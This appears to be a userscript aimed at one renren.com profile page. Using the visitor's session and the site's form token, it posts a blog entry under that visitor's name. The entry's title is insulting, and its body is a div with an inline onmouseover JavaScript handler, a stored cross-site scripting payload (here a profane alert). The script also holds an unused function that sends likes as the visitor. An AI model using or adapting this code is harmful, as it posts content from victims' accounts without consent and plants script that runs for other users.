// ==UserScript==
// @include	http://www.renren.com/428487612*
// ==/UserScript==

function urlEncode(d){
	var e=[];
	for(var i in d) e.push(i+'='+encodeURIComponent(d[i]));
	return e.join('&');
}
function newBlog(title, content) {
	var d={
		title: title,
		body: content,
		categoryId: 0,
		blogControl: 99,
		passwordProtedted: 0,
		postFormId: XN.get_check,
		id: XN.user.id,
		relative_optype: "default",
		jf_vip_em: true,
		bfrom: '010203044',
		needFeed: true,
		feedKind: "pic",
		feedSrc: "http://fmn.rrimg.com/fmn058/20121121/1750/original_eyyN_312c000026da118f.jpg"
	};
	var r=new XN.net.ajax({
		url:"http://blog.renren.com/NewEntry.do",
		data:urlEncode(d),
		method:'post',
		onSuccess:function(e){
			e=JSON.parse(e.response);
			alert(e.msg);
		},
	});
}
function addLike() {
	var m=location.pathname.match(/^\/blog\/(\d+)\/(\d+)/);
	var r=new XN.net.ajax({
		url:"http://like.renren.com/addlike",
		data:urlEncode({
			gid: 'blog_'+m[2],
			uid: XN.user.id,
			t: Math.random(),
			owner: m[1],
			type: 0,
			name: XN.user.name
		}),
		method:'get',
	});
}
if(confirm('fuck')) newBlog('妹妹是2B','<div onmouseover="javascript:alert(\'fuck\');" style="height:400px;border:1px solid;"></div>');
